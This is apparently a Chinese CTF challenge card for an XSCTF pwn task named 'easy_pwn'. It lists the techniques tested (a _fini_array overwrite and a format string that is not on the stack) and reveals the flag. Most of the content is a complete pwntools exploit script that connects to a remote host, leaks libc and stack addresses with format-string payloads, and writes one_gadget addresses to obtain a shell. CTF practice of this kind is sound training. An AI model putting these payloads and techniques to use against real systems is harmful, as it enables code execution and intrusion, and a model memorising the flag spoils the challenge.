- **题目名称：** easy_pwn
- **题目类型：** PWN
- **题目难度：**中等偏下
- **出题人：** she1p
- **考点：**

1. 修改_fini_array
2. 非栈上格式化字符串

- **描述：** 欢迎来到XSCTF SHOP
- **flag：** XSCTF{D0_Y0u_lik3_This_Chal1eng3}
- **Writeup：**

```python
# 20.04
from pwn import *
context(log_level='debug',arch='amd64',os='linux')
p=process('./easy_pwn1')
p=remote('43.248.97.200',40050)
libc=ELF('./libc.so.6')
elf=ELF('./easy_pwn1')


main=0x401296

p.sendlineafter('do you want to shop?\n',b'yes')

def buy(payload):
    p.sendlineafter('What do you want to buy?\n',b'G')
    p.sendafter('but can we collect the goods to your home and leave your address conveniently.\n',payload)

#one_gadget=[0x50a37,0xebcf1,0xebcf5,0xebcf8,0xebd52,0xebdaf,0xebdb3]
one_gadget=[0xe3afe,0xe3b01,0xe3b04]

payload1=b'%150c%8$hhn-%11$p-%13$p'
buy(payload1)
p.recvuntil('-')
libc_base=int(p.recv(14),16)-0x24083
success('libc_base:'+hex(libc_base))
p.recvuntil('-')
stack_addr=int(p.recv(14),16)-0x1d0
success('stack_addr:'+hex(stack_addr))
stack1=stack_addr%0x10000
success('stack1:'+hex(stack1))

payload2='%'+str(stack1)+'c%13$hn'+'%2c%29$hn'
buy(payload2)
#gdb.attach(p)
#pause()
p.sendlineafter('do you want to shop?\n',b'yes')
one1=(libc_base+one_gadget[0])%0x10000
success('one:'+hex(one1))
one2=((libc_base+one_gadget[0])>>16)%0x100
success('one2:'+hex(one2))
payload3='%'+str(one2)+'c%71$hhn%'+str(one1-one2)+'c%69$hn'
buy(payload3)
buy(b'a')
p.interactive()
```

